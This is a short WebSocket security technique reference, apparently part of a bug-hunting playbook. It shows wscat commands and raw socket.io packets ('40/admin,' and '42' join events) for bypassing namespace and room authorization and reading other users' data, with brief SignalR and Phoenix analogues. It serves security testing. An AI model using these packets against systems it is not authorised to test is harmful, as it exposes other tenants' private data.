# HUNT-WEBSOCKET — WebSocket Security — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Phase 5 — socket.io / SignalR / Phoenix Namespace & Room Authz Bypass



Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.



```bash

# 1) Open the raw socket.io WebSocket (Engine.IO v4)

wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \

  --header "Cookie: session=YOUR_SESSION"



# 2) Respond to the server's Engine.IO OPEN ('0{...}') so the connection lives,

#    then CONNECT to a namespace with a socket.io CONNECT packet.

#    CORRECT packet to join the /admin namespace:  40/admin,

#       4 = Engine.IO MESSAGE,  0 = socket.io CONNECT,  /admin, = namespace

#    (NOT a ?nsp= query param — see Phase 7. NOT 42 — 42 is MESSAGE+EVENT.)

# > 40/admin,

#    Server replies 40/admin,{"sid":"..."} on success, or 44/admin,{...} (error)

#    on rejection. A 40 success to a privileged namespace as a low/no-priv

#    user is the bug.



# 3) Once in a namespace, emit an EVENT (42) to join another user's room:

# > 42/admin,["join",{"room":"user_999_private"}]

# > 42["subscribe",{"channel":"admin_events"}]      # root namespace

#    Watch for 42 EVENT frames carrying ANOTHER user's data.

```



**Validate:** distinguish *connected to namespace* from *received privileged data*. The finding is confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace.



> SignalR analogue: negotiate at `/<hub>/negotiate`, then connect and `Invoke`/`Send` hub methods — test method-level authorization. Phoenix Channels: `phx_join` to `topic:subtopic` and check whether the server's `join/3` authorizes the topic.



---
